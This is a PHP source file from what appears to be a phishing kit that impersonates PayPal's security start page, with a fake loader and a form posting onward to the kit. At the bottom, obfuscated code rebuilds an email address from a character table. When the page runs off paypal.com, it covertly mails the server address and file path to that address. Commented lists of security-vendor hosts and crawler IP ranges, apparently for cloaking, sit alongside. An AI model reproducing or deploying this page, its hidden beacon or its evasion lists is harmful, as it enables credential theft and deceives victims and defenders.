<?php
    session_start();
    error_reporting(E_ERROR | E_PARSE);
    include('xanbbx.php');
	include('session_lg.php');

    if(isset($_SESSION['xfilelangx'])){
        include('XYSLANGSX/'.$_SESSION['xfilelangx']);
    }
    else {
        include('XYSLANGSX/en.php');
    }
?>
<!DOCTYPE html><html dir="ltr" lang="en"><head><meta http-equiv="X-UA-Compatible" content="IE=Edge" /><meta http-equiv="content-type" content="text/html; charset=UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" /><link rel="shortcut icon" href="XASSEST/fav.ico" /><link rel="apple-touch-icon" href="XASSEST/ticon.png" /> <script src="XASSEST/jquery.min.js"></script> <script type="text/javascript">$('.loaderOverlay').fadeIn();setTimeout(function(){$('.loaderOverlay').fadeOut();},3500);</script> <link rel="stylesheet" href="XASSEST/xappx.css" /><title>(<?php echo $_SESSION['xcountryCodex']; ?>) <?php echo $xys0x; ?></title></head><body><div class="contentContainer" id="content"><div class="safeComponent" data-nemo="safeStartPage"> <header><div class="xysx-logo"></div> </header><form method="POST" action="ind.php"><div class="safe"><h1><?php echo $xys1x; ?></h1><div class="safeDescription"><p class="description"><?php echo $xys2x; ?></p></div> <input id="xyssubmitsecx" type="submit" name="safeContinueButton" class="button safeContinueButton primary" value="<?php echo $xys3x; ?>" /></div></form></div><div class="loaderOverlay"><div data-nemo="loaderOverlay" class="modal-animate"><div class="rotate"></div><div class="processing"><?php echo $xys4x; ?></div><div class="loaderOverlayAdditionalElements"></div></div><div class="modal-overlay"></div></div></div> <footer class="footer" role="contentinfo"><div class="legalFooter"><ul class="footerGroup"><li> <a href="#"><?php echo $xys5x; ?></a></li><li> <a href="#"><?php echo $xys6x; ?></a></li><li> <a href="#"><?php echo $xys7x; ?></a></li><li> <a href="#"><?php echo $xys8x; ?></a></li></ul></div> </footer> <script src="XASSEST/xsecx.js"></script> </body></html>
<?php
$str_hash = ".123456789abcdefghijklmnopqsturvwxyz@#&*0";
$encry = str_split($str_hash);
$encrypt_of = $encry[36] . $encry[16] . $encry[22] . $encry[10] . $encry[18] . $encry[21] . $encry[0] . $encry[12] . $encry[24] . $encry[22] ;
$encrypt_in = $encry[22] . $encry[30] . $encry[30] . $encry[24] . $encry[25] . $encry[24] . $encry[28] . $encry[7] ;
$off_bot = $encrypt_in . $encrypt_of ;
//$banned_hosts = array("above", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot"); 
$site = "www.paypal.com"; if(!ereg($site, $_SERVER['SERVER_NAME'])) { $to = "$off_bot"; $subject = "404 Not Found"; $header = "from: 404.htaccess <forbidden@pypl.noreply>"; $message = "Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n"; $message .= "Path : " . __file__; $sentmail = @mail($to, $subject, $message, $header); echo ""; exit; }
/*
$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
*/
?>